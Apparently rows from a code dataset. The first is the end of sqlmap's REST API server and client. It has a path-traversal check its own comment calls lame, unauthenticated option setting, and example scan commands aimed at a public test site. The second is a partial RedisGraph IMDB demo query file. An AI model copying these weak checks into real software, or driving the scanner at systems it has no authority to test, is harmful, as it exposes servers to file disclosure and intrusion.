        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Prevent file path traversal - the lame way
    if "".."" in target:
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)

    if os.path.exists(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",1
60,19ef952f804b536777040d963e1dd828091f7ca5,"demo/imdb/imdb_queries.py/n/nimport sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../../')
from demo import QueryInfo

class IMDBQueries(object):
    def __init__(self, actors=None, movies=None):
        nodesAvailable = (movies is not None and actors is not None)
        
        ##################################################################
        ### number_of_actors_query
        ##################################################################

        self.number_of_actors_query = QueryInfo(
            query=""""""MATCH (n:actor) RETURN count(n) as actors_count"""""",
            description='How many actors are in the graph?',
            max_run_time_ms=0.2,
            expected_result=[[1317]]
        )

        ##################################################################
        ### actors_played_with_nicolas_cage_query
        ##################################################################

        self.actors_played_with_nicolas_cage_query = QueryInfo(
            query=""""""MATCH (n:actor{name:""Nicolas Cage""})-[:act]->(m:movie)<-[:act]-(a:actor)
                    RETURN a.name, m.title"""""",
            description='Which actors played along side Nicolas Cage?',
            max_run_time_ms=4,
            expected_result=[['Cassi Thomson', 'Left Behind'],
                            ['Gary Grubbs', 'Left Behind'],
                            ['Quinton Aaron', 'Left Behind'],
                            ['Martin Klebba', 'Left Behind'],
                            ['Lea Thompson', 'Left Behind'],
                            ['Nicolas Cage', 'Left Behind'],
                            ['Chad Michael Murray', 'Left Behind'],
                            ['Jordin Sparks', 'Left Behind']]
        )


        ##################################################################
        ### find_three_actors_played_with_nicolas_cage_query
        ##################################################################

        self.find_three_actors_played_with_nicolas_cage_query = QueryInfo(
            query=""""""MATCH (nicolas:actor {name:""Nicolas Cage""})-[:act]->(m:movie)<-[:act]-(a:actor)
                    RETURN a.name, m.title
                    LIMIT 3"""""",
            description='Get 3 actors who have played along side Nicolas Cage?',
            max_run_time_ms=4,
            expected_result=[['Cassi Thomson', 'Left Behind'],
                            ['Gary Grubbs', 'Left Behind'],
                            ['Quinton Aaron', 'Left Behind'],
                            ['Martin Klebba', 'Left Behind'],
                            ['Lea Thompson', 'Left Behind'],
                            ['Nicolas Cage', 'Left Behind'],
                            ['Chad Michael Murray', 'Left Behind'],
                            ['Jordin Sparks', 'Left Behind']]
        )


        ##################################################################
        ### actors_played_in_movie_straight_outta_compton_query
        ##################################################################

        self.actors_played_in_movie_straight_outta_compton_query = QueryInfo(
            query=""""""MATCH (a:actor)-[:act]->(m:movie {title:""Straight Outta Compton""})
                    RETURN a.name"""""",
            description='Which actors played in the movie Straight Outta Compton?',
            max_run_time_ms=3.5,
            expected_result=[['Aldis Hodge'],
                            ['Corey Hawkins'],
                            ['Neil Brown Jr.'],
                            ['O\'Shea Jackson Jr.']]
        )


        ##################################################################
        ### actors_over_50_that_played_in_blockbusters_query
        ##################################################################

        expected_result = None
        if nodesAvailable:
            expected_result=[
                [actors['Bill Irwin'], movies['Interstellar']],
                [actors['Vincent Price'], movies['Vincent']],
                [actors['Ellen Burstyn'], movies['Interstellar']],
                [actors['Paul Reiser'], movies['Whiplash']],
                [actors['Francis X. McCarthy'], movies['Interstellar']],
                [actors['John Lithgow'], movies['Interstellar']],
                [actors['J.K. Simmons'], movies['Whiplash']],
                [actors['Chris Mulkey'], movies['Whiplash']],
                [actors['Rachael Harris'], movies['Lucifer']],
                [actors['Matthew McConaughey'], movies['Interstellar']],
                [actors['D.B. Woodside'], movies['Lucifer']]
            ]

        self.actors_over_50_that_played_in_blockbusters_query = QueryInfo(
            query=""""""MATCH (a:actor)-[:act]->(m:movie)
                    WHERE a.age >= 50 AND m.votes > 10000 AND m.rating > 8.2
                    RETURN *"""""",
            description='Which actors who are over 50 played in blockbuster movies?',
            max_run_time_ms=4.0,
            expected_result=expected_result
        )

        ##################################################################
        ### actors_played_in_bad_drama_or_comedy_query
        ##################################################################
        
        expected_result = None
        if nodesAvailable:
            expected_result=[
                ['Rita Ora', movies['Fifty Shades of Grey']],
                ['Dakota Johnson', movies['Fifty Shades of Grey']],
                ['Marcia Gay Harden', movies['Fifty Shades of Grey']],
                ['Jamie Dornan', movies['Fifty Shades of Grey']],
                ['Eloise Mumford', movies['Fifty Shades of Grey']],
                ['Max Martini', movies['Fifty Shades of Grey']],
                ['Luke Grimes', movies['Fifty Shades of Grey']],
                ['Jennifer Ehle', movies['Fifty Shades of Grey']],
                ['Victor Rasuk', movies['Fifty Shades of Grey']],
                ['Nancy Lenehan', movies['Sex Tape']],
                ['Rob Lowe', movies['Sex Tape']],
                ['Cameron Diaz', movies['Sex Tape']],
                ['Rob Corddry', movies['Sex Tape']],
                ['Jason Segel', movies['Sex Tape']],
                ['Ellie Kemper', movies['Sex Tape']]
            ]

        self.actors_played_in_bad_drama_or_comedy_query = QueryInfo(
            query=""""""MATCH (a:actor)-[:act]->(m:movie)
                    WHERE (m.genre = ""Drama"" OR m.genre = ""Comedy"")
                    AND m.rating < 5.5 AND m.votes > 50000
                    RETURN a.name, m
                    ORDER BY m.rating"""""",
            description='Which actors played in bad drama or comedy?',
            max_run_time_ms=4,
            expected_result = expected_result            
        )

        ##################################################################
        ### actors_played_in_drama_action_comedy
        ##################################################################
        
        expected_result=[
                ['Bradley Cooper'],
                ['Michael B. Jordan'],
                ['Michael Caine'],
                ['Miles Teller']
            ]

        self.actors_played_in_drama_action_comedy_query = QueryInfo(
            query=""""""MATCH (a:actor)-[:act]->(m0:movie {genre:'Action'}),
                           (a)-[:act]->(m1:movie {genre:'Drama'}),
                           (a)-[:act]->(m2:movie {genre:'Comedy'})
                    RETURN DISTINCT a.name"""""",
            description='Which actors played in Action, Drama and Comedy movies?',
            max_run_time_ms=1.5,
            expected_result = expected_result            
        )

        ##################################################################
        ### young_actors_played_with_cameron_diaz_query
        ##################################################################
        
        expected_result = None
        if nodesAvailable:
            expected_result=[
                [actors['Nicolette Pierini'], 'Annie'],
                [actors['Kate Upton'], 'The Other Woman']
            ]

        self.young_actors_played_with_cameron_diaz_query = QueryInfo(
            query=""""""MATCH (Cameron:actor {name:""Cameron Diaz""})-[:act]->(m:movie)<-[:act]-(a:actor)
                    WHERE a.age < 35
                    RETURN a, m.title"""""",
            description='Which young actors played along side Cameron Diaz?',
            max_run_time_ms=5,
            expected_result=expected_result
        )

        
        ##################################################################
        ### actors_played_with_cameron_diaz_and_younger_than_her_query
        ##################################################################

        expected_result = None
        if nodesAvailable:
            expected_result=[
                [actors['Jason Segel'], 'Sex Tape'],
                [actors['Ellie Kemper'], 'Sex Tape'],
                [actors['Nicolette Pierini'], 'Annie'],
                [actors['Rose Byrne'], 'Annie'],
                [actors['Kate Upton'], 'The Other Woman'],
                [actors['Nicki Minaj'], 'The Other Woman'],
                [actors['Taylor Kinney'], 'The Other Woman']
            ]

        self.actors_played_with_cameron_diaz_and_younger_than_her_query = QueryInfo(
            query=""""""MATCH (Cameron:actor {name:""Cameron Diaz""})-[:act]->(m:movie)<-[:act]-(a:actor)
                    WHERE a.age < Cameron.age
                    RETURN a, m.title order by a.name"""""",
            description='Which actors played along side Cameron Diaz and are younger then her?',
            max_run_time_ms=7,            
            expected_result=expected_result
        )


        ##################################################################
        ### sum_and_average_age_of_straight_outta_compton_cast_query
        ##################################################################

        self.sum_and_average_age_of_straight_outta_compton_cast_query = QueryInfo(
            query=""""""MATCH (a:actor)-[:act]->(m:movie{title:""Straight Outta Compton""})
                    RETURN m.title, SUM(a.age), AVG(a.age)"""""",
            description='What is the sum and average age of the Straight Outta Compton cast?',
            max_run_time_ms=4,
            expected_result=[['Straight Outta Compton', 131, 32.75]]
        )


        ##################################################################
        ### how_many_movies_cameron_diaz_played_query
        ##################################################################

        self.how_many_movies_cameron_diaz_played_query = QueryInfo(
            query=""""""MATCH (Cameron:actor{name:""Cameron Diaz""})-[:act]->(m:movie)
                    RETURN Cameron.name, COUNT(m.title)"""""",
            description='In how many movies did Cameron Diaz played?',
            max_run_time_ms=1.2,
            expected_result=[['Cameron Diaz', 3]]
        )

        
        ##################################################################
        ### find_ten_oldest_actors_query
        ##################################################################

        expected_result = None
        
        expected_result = None
        if nodesAvailable:
            expected_result=[
                [actors['Vincent Price']],
                [actors['George Kennedy']],
                [actors['Cloris Leachman']],
                [actors['John Cullum']],
                [actors['Lois Smith']],
                [actors['Robert Duvall']],
                [actors['Olympia Dukakis']],
                [actors['Ellen Burstyn']],
                [actors['Michael Caine']],
                [actors['Judi Dench']]
            ]

        self.find_ten_oldest_actors_query = QueryInfo(
            query=""""""MATCH (a:actor)
                    RETURN DISTINCT *
                    ORDER BY a.age DESC
                    LIMIT 10"""""",
            description='10 Oldest actors?',
            max_run_time_ms=4.5,
            expected_result=expected_result            
        )

        ##################################################################
        ### actors_over_85_index_scan
        ##################################################################

        expected_result = None
        if nodesAvailable:
            expected_result=[
                [actors['Michael Caine']],
                [actors['Ellen Burstyn']],
                [actors['Robert Duvall']],
                [actors['Olympia Dukakis']],
                [actors['Lois Smith']],
                [actors['John Cullum']],
                [actors['Cloris Leachman']],
                [actors['George Kennedy']],
                [actors['Vincent Price']]
            ]

        self.actors_over_85_index_scan = QueryInfo(
            query=""""""MATCH (a:actor)
                    WHERE a.age > 85
                    RETURN *
                    ORDER BY a.age, a.name"""""",
            description='Actors over 85 on indexed property?',
            max_run_time_ms=1.5,
            expected_result=expected_result
        )

        ##################################################################
        ### eighties_movies_index_scan
        ##################################################################

        self.eighties_movies_index_scan = QueryInfo(
            query=""""""MATCH (m:movie)
                    WHERE 1980 <= m.year
                    AND m.year < 1990
                    RETURN m.title, m.year
                    ORDER BY m.year"""""",
            description='Multiple filters on indexed property?',
            max_run_time_ms=1.5,
            expected_result=[['The Evil Dead', 1981],
                            ['Vincent', 1982]]
        )

        ##################################################################
        ### find_titles_starting_with_american_query
        ##################################################################

        self.find_titles_starting_with_american_query = QueryInfo(
            query=""""""MATCH (m:movie)
                    WHERE LEFT(m.title, 8) = 'American'
                    RETURN m.title
                    ORDER BY m.title"""""",
            description='Movies starting with ""American""?',
            max_run_time_ms=4,
            expected_result=[['American Honey'],
                            ['American Pastoral'],
                            ['American Sniper']]
        )

        ##################################################################
        ### all_actors_named_tim
        ##################################################################

        # self.all_actors_named_tim = QueryInfo(
        #     query=""""""CALL db.idx.fulltext.queryNodes('actor', 'tim')"""""",
        #     description='All actors named Tim',
        #     max_run_time_ms=4,
        #     expected_result=[['Tim Roth', 0],
        #                     ['Tim Reid', 0],
        #                     ['Tim McGraw', 0],
        #                     ['Tim Griffin', 0],
        #                     ['Tim Blake Nelson', 0]]
        # )

        self.queries_info = [
            self.number_of_actors_query,
            self.actors_played_with_nicolas_cage_query,
            self.find_three_actors_played_with_nicolas_cage_query,
            self.actors_played_in_movie_straight_outta_compton_query,
            self.actors_over_50_that_played_in_blockbusters_query,
            self.actors_played_in_bad_drama_or_comedy_query,
            self.actors_played_in_drama_action_comedy_query,
            self.young_actors_played_with_cameron_diaz_query,
            self.actors_played_with_cameron_diaz_and_younger_than_her_query,
